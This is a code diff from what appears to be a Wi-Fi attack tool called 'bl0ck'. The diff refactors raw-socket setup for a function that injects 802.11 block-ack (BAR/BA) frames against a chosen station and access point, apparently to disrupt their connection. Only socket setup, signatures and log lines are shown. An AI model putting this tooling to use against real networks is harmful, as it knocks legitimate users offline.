@@ -95,16 +95,10 @@ static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface
 	}, iface, filter, seconds(timeout_sec));
 }
 
-void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string &iface, const int frame_in_batch,
-			const string &attack_type, const int duration_sec, const bool is_random, const int ms_interval
-){
-	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
-
-	log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);
-
-	// Raw AF_PACKET socket with MSG_DONTWAIT: when the USB TX URB queue is full,
-	// sendto() returns EAGAIN immediately instead of blocking iface what use synchronous (mt76x2u)
-	// Frames are dropped but the timing loop runs as designed
+// Raw AF_PACKET socket with MSG_DONTWAIT: when the USB TX URB queue is full,
+// sendto() returns EAGAIN immediately instead of blocking iface what use synchronous (mt76x2u)
+// Frames are dropped but the timing loop runs as designed
+RawSocket get_unblocking_socket(const string &iface){
 	const int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
 	if(fd < 0) throw runtime_error(string("bl0ck: socket: ") + strerror(errno));
 	ifreq ifr{};
@@ -115,6 +109,17 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string
 	addr.sll_protocol = htons(ETH_P_ALL);
 	addr.sll_ifindex  = ifr.ifr_ifindex;
 	bind(fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr));
+	return {fd, addr};
+}
+
+void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string &iface, const int frame_in_batch,
+			const string &attack_type, const int duration_sec, const bool is_random, const int ms_interval
+){
+	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
+
+	log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);
+
+	auto [fd, addr] = get_unblocking_socket(iface);
 
 	log(LogLevel::INFO, "Sending frames - Duration: {} sec, Concurrent frames: {}", duration_sec, frame_in_batch);
 
